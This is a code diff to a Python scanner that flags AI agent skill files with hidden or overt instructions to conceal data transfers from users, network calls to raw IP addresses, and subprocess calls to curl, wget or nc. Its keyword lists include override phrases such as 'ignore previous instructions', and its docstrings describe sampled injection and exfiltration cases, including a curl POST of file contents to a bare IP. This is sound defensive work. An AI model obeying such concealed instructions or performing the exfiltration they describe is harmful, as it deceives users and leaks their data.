@@ -120,6 +120,28 @@ BYTECODE_PATTERNS = [
     (r"compile\s*\([^)]*['\"]exec['\"]", "Compiles a string into executable code at runtime"),
 ]
 
+# Directive language that has no reason to appear where a human reading
+# the file isn't meant to notice it. Module-level so both the hidden-
+# comment check (module 6) and the whole-document check (module 9) can
+# share the exact same list.
+SUSPICIOUS_PHRASES = [
+    "system:", "do not mention", "don't mention", "do not tell the user",
+    "silently", "without telling", "without informing", "ignore the user",
+    "ignore previous instructions", "hidden instruction", "secretly",
+]
+
+SECRECY_SIGNALS = [
+    "silently", "secretly", "quietly", "do not mention", "don't mention",
+    "do not tell", "don't tell", "without telling", "without informing",
+    "without their knowledge", "keep this from", "leave this out of",
+    "avoid mentioning", "not visible to the user", "hide this from",
+    "system:", "assistant:", "ignore the user", "ignore previous",
+]
+ACTION_SIGNALS = [
+    "send", "post", "upload", "transmit", "exfiltrate", "forward",
+    "sync to", "copy to", "http://", "https://", "curl ", "requests.",
+]
+
 # .pyc mentions need a real loading context nearby, not just the string
 # appearing anywhere - e.g. a .gitignore-style 'exclude these' list
 # mentioning *.pyc has no bytecode-loading intent at all. Found as a
@@ -378,31 +400,11 @@ def find_hidden_instructions(text):
         r"<!--(.*?)-->",
     ]
 
-    # Directive language that has no reason to appear in a comment
-    # meant to be invisible to the end user.
-    SUSPICIOUS_PHRASES = [
-        "system:", "do not mention", "don't mention", "do not tell the user",
-        "silently", "without telling", "without informing", "ignore the user",
-        "ignore previous instructions", "hidden instruction", "secretly",
-    ]
-
     # Category-based detection (catches paraphrasing, not just exact
     # phrases): a hidden comment combining ANY secrecy language with
     # ANY data-movement language is suspicious regardless of the exact
     # words used - this is what lets Husk catch intent, not just the
     # specific sentence from one published example.
-    SECRECY_SIGNALS = [
-        "silently", "secretly", "quietly", "do not mention", "don't mention",
-        "do not tell", "don't tell", "without telling", "without informing",
-        "without their knowledge", "keep this from", "leave this out of",
-        "avoid mentioning", "not visible to the user", "hide this from",
-        "system:", "assistant:", "ignore the user", "ignore previous",
-    ]
-    ACTION_SIGNALS = [
-        "send", "post", "upload", "transmit", "exfiltrate", "forward",
-        "sync to", "copy to", "http://", "https://", "curl ", "requests.",
-    ]
-
     for pattern in comment_patterns:
         for match in re.finditer(pattern, text, re.IGNORECASE | re.DOTALL):
             comment_body = match.group(1)
@@ -656,6 +658,115 @@ def find_instruction_override(text):
     return findings
 
 
+def find_overt_secrecy_language(text):
+    """
+    Module 9: overt secrecy-language detection (whole document, not just
+    hidden comments) - COMBINED with a data-movement action.
+
+    Same principle as module 8: module 6 (hidden instructions) only
+    checks secrecy language INSIDE markdown/HTML comments, assuming
+    attackers hide it. A real sample found in large-scale testing
+    disguised a malicious instruction as a custom '<tool_description>'
+    XML-style tag inside a .py file - not a real HTML comment, so it
+    never reached module 6's check at all, despite saying, in plain
+    text, 'Do not mention this to the user.'
+
+    IMPORTANT PRECISION FIX: an earlier version of this check flagged
+    any secrecy word (e.g. "silently") appearing anywhere in the
+    document, and found via large-scale false-positive testing that
+    this is far too broad - "silently ignored", "fails silently",
+    "silently overwrite" are extremely common, completely benign
+    phrases in ordinary technical writing. Requiring the secrecy word
+    to appear TOGETHER WITH a data-movement action word in the same
+    paragraph (same combination logic already proven in module 6)
+    restores precision while still catching the real pattern this
+    module exists for.
+    """
+    findings = []
+    for phrase in SECRECY_SIGNALS:
+        for match in re.finditer(re.escape(phrase), text, re.IGNORECASE):
+            if _is_negated(text, match.start()):
+                continue
+            # Tight window (not a full paragraph - markdown tables and
+            # long sections have no blank lines between rows, so a
+            # paragraph-sized window pulled in unrelated words from far
+            # away and caused real false positives, found via testing).
+            window_start = max(0, match.start() - 200)
+            window_end = min(len(text), match.end() + 200)
+            window = text[window_start:window_end].lower()
+
+            # Word-boundaried action match - "post" as a bare substring
+            # matched inside "re-post" and "postgresql", a real false-
+            # positive bug found via testing. \b fixes it.
+            action_hits = [
+                a for a in ACTION_SIGNALS
+                if re.search(r"\b" + re.escape(a.strip()) + r"\b", window)
+            ]
+            if not action_hits:
+                continue  # secrecy word alone, no action nearby - too common to flag
+
+            line_num = text[:match.start()].count("\n") + 1
+            findings.append(
+                f"Line {line_num}: overt secrecy language ('{phrase}') "
+                f"combined with a data-movement action ({action_hits[0]}) "
+                f"in plain document text - a legitimate tool has no reason "
+                f"to instruct an agent to conceal a data-related action "
+                f"from the user."
+            )
+    return findings
+
+
+def find_exfil_to_raw_ip(text):
+    """
+    Module 10: network calls targeting a bare IP address.
+
+    A well-known, fairly precise C2 (command-and-control) indicator:
+    legitimate tools and services are referenced by domain name, almost
+    never by a bare IP address. Found via a real sample in large-scale
+    testing: a curl call POSTing file contents to '91.243.59.27:8080'.
+    """
+    findings = []
+    # Matches curl/wget/requests/etc. calls where the target looks like
+    # a raw IPv4 address rather than a domain name.
+    pattern = r"(curl|wget|requests\.|urlopen|fetch\s*\()[^\n]{0,60}\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b"
+    for match in re.finditer(pattern, text, re.IGNORECASE):
+        line_num = text[:match.start()].count("\n") + 1
+        findings.append(
+            f"Line {line_num}: network call targets a bare IP address "
+            f"({match.group(2)}) rather than a domain name - legitimate "
+            f"services are almost always referenced by domain; a raw IP "
+            f"target is a well-known indicator of C2 (command-and-control) "
+            f"infrastructure."
+        )
+    return findings
+
+
+def find_subprocess_network_exfil(text):
+    """
+    Module 11: subprocess calls invoking curl/wget/nc directly, in
+    list form, regardless of shell=True.
+
+    Module 1's subprocess check only flags shell=True (the shell-
+    injection-risk configuration, matching bandit's own scope - see
+    that module's comment). But a list-form subprocess.run(["curl",
+    ...]) call is still a real way to exfiltrate data even without
+    shell=True; it just doesn't carry the *injection* risk. This is a
+    different, narrower, real signal: found via a sample where
+    subprocess.run(["curl", "-X", "POST", ip, "-d", "@" + filepath])
+    exfiltrated file contents without ever using shell=True.
+    """
+    findings = []
+    pattern = r"subprocess\.(Popen|call|run)\s*\(\s*\[\s*[\"'](curl|wget|nc|netcat)[\"']"
+    for match in re.finditer(pattern, text, re.IGNORECASE):
+        line_num = text[:match.start()].count("\n") + 1
+        findings.append(
+            f"Line {line_num}: subprocess call directly invokes "
+            f"'{match.group(2)}' ('{match.group(0)}') - a real way to send "
+            f"data over the network even without shell=True."
+        )
+    return findings
+
+
 def scan_skill_file(path):
     try:
         with open(path, "r", encoding="utf-8", errors="replace") as f:
@@ -708,6 +819,17 @@ def scan_skill_file(path):
     # Check 10: overt instruction-override language (not just hidden
     # comments - found via large-scale real-world testing)
     findings.extend(find_instruction_override(text))
+
+    # Check 11: overt secrecy language, whole document (same principle
+    # as check 10, applied to module 6's phrase list)
+    findings.extend(find_overt_secrecy_language(text))
+
+    # Check 12: network calls targeting a bare IP address (C2 indicator)
+    findings.extend(find_exfil_to_raw_ip(text))
+
+    # Check 13: subprocess calls invoking curl/wget/nc directly, list
+    # form, regardless of shell=True
+    findings.extend(find_subprocess_network_exfil(text))
 
     if findings:
         return {"verdict": "FLAGGED", "findings": findings}
